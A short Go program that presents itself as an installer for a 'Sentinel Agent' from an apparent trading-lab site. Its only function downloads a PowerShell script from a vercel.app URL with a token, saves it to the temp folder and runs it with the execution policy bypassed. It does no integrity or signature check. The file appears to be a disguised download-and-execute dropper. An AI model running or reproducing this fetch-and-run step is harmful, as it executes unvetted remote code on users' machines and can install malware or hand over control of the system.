package main

import (
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
)

const installerURL = "https://sentinel-trading-lab.vercel.app/downloads/install-agent.ps1?v=8.6.0&t=agt_v86_6b3e8119f3104c0490b2320c5829df86"

func main() {
    tmp := filepath.Join(os.TempDir(), "sentinel-install-v86.ps1")
    ps := fmt.Sprintf(`$ErrorActionPreference='Stop'; Invoke-WebRequest -UseBasicParsing '%s' -OutFile '%s'; & '%s'`, installerURL, tmp, tmp)
    cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Stdin = os.Stdin
    if err := cmd.Run(); err != nil { fmt.Fprintln(os.Stderr, "Sentinel Agent install failed:", err); os.Exit(1) }
}
